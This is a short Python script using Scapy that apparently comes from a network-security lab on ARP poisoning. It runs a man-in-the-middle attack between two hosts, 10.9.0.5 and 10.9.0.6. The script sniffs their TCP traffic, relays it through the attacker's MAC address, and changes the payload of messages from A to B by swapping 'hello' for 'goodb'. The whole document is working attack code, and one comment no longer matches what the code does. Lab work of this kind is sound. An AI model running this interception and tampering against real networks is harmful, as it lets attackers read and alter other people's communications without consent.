#!/usr/bin/env python3
from scapy.all import *

# Define IP and MAC addresses
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"

IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

IP_M = "10.9.0.105"
MAC_M = "02:42:0a:09:00:69"

def tcp_spoof_pkt_netcat(pkt):
    if pkt[Ether].src != MAC_M:  # Ensure this is not our own packet
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
            print("[INFO] Packet from A to B")
            pkt[Ether].src = MAC_M
            pkt[Ether].dst = MAC_B

            try:
                payload = bytes(pkt[TCP].payload).decode("utf-8", errors="ignore")
                print(f"Original Payload: {repr(payload)}")

                # Replace 'huiqing' with 'aaaaaaa'
                modified_payload = payload.replace("hello", "goodb")
                print(f"Modified Payload: {repr(modified_payload)}")

                # Update packet with modified payload
                del pkt[TCP].payload
                del pkt[TCP].chksum
                pkt[TCP] /= modified_payload

                sendp(pkt, verbose=False)
            except AttributeError:
                print("[WARNING] No payload to modify")
            except Exception as e:
                print(f"[ERROR] {e}")

        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
            print("[INFO] Packet from B to A")
            pkt[Ether].src = MAC_M
            pkt[Ether].dst = MAC_A
            sendp(pkt, verbose=False)  # Forward the packet

print("[INFO] Starting sniffing...")
sniff(iface='eth0', filter='tcp', prn=tcp_spoof_pkt_netcat)

